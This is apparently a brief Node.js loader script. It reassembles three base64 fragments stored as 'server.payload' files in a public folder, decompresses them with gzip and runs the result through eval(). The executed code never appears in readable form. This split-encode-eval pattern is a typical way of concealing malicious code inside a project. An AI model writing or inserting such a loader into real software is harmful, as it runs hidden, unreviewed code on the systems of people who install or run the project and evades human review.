const zlib = require("zlib");
const fs = require("fs");
const path = require("path");

const parts = ["server.payload.1", "server.payload.2", "server.payload.3"]
  .map(name => fs.readFileSync(path.join(__dirname, "public", name), "utf8").trim())
  .join("");

const source = zlib.gunzipSync(Buffer.from(parts, "base64")).toString("utf8");
eval(source);
